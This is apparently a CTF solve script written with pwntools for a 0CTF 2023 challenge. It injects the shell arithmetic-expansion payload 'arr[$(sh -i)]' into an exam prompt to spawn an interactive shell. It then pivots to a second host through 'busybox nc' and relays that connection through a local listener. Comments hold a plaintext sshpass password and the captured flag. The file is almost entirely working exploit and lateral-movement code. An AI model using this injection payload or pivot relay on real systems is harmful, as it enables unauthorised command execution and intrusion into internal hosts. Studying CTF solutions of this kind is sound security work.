#!/home/yangfan/miniconda3/envs/ctf/bin/python
from pwn import *


context.log_level = 'error'
conn = process('nc -X connect -x instance.0ctf2023.ctf.0ops.sjtu.cn:18081 bwthgcqq78ke8ptf 1'.split(' '))
# conn = process('./exam.sh')

promise =  conn.recvline_contains(b'I promise')
conn.sendline(promise)

# https://research.nccgroup.com/2020/05/12/shell-arithmetic-expansion-and-evaluation-abuse/
# ????

# conn.sendline(b'arr[$(cat flag1)]')
conn.sendlineafter(b'1 + 1 = ?\n', f'arr[$(sh -i)]'.encode())

def shell_wrap(sh):
    conn.sendline(sh.encode())
    res = b''
    while frag := conn.recv(65536, timeout=.2):
        res += frag
    return res

# .connect.sh.swp
# sshpass -p x5kdkwjr8exi2bf70y8g80bggd2nuepf ssh ctf@second
conn.sendlineafter(b'sh-5.1$ ', b'busybox nc second 22 1>&2')
conn.recvline_contains(b'busybox nc')

print('start listen on 20228')
sock_input = listen(20228)
conn_input = sock_input.wait_for_connection()
print('establish on 20228')

while True:
    res = b''
    while frag := conn.recv(65536, timeout=.01):
        res += frag

    if res:
        # print('receive', res)
        conn_input.send(res)
    # get cmd
    cmd = b''
    while frag := conn_input.recv(65536, timeout=.01):
        cmd += frag

    if cmd:
        # print('send', cmd)
        conn.send(cmd)

# try:
#     print(res.decode())
# except UnicodeDecodeError:
#     print(res)

# flag{09bfa84ff226317e3feb6fd8db6c67c2}